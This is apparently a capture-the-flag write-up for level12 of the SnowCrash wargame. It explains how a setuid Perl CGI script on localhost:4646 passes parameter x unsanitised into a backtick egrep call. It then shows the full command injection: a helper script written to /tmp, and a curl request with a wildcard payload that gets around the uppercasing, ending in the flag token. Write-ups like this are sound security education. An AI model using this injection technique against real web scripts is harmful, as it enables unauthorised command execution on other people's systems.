We see file level12.PL:
```
level12@SnowCrash:~$ ls -la
[...]
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
```
```
level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));

```
We see that you can inject the transfer as the parameter x to the command `getflag`.  
However, the contents of the x parameter will first be converted to capital letters,
and then removed everything that follows the space character.
```
n(t(param("x"), param("y")));
```
```
sub t {
[...]
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
[...]
```
Also, we cannot transfer only one command, since the output will not be shown to us,
so we must save the result of the command to a file. Also, for the command to be executed, it is necessary to enclose it in backticks.
```
level12@SnowCrash:~$ echo 'echo `getflag` > /tmp/output' > /tmp/GETFLAG
```
Because the script will run from another user, you need to give him rights
```
level12@SnowCrash:~$ chmod +x /tmp/GETFLAG
```
Since the entire path to the file will be converted to capital letters, we need to transfer it using wildcard.
We also need to refer to the server itself, from the commentary to the script we see the address of our server.
```
level12@SnowCrash:~$ curl 'localhost:4646?x="`/*/GETFLAG`"'
```
Now let's see the contents of the file:
```
level12@SnowCrash:~$ cat /tmp/output"'
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
This is out token: `g1qKMiRpXf53AWhDaU7FEkczr`
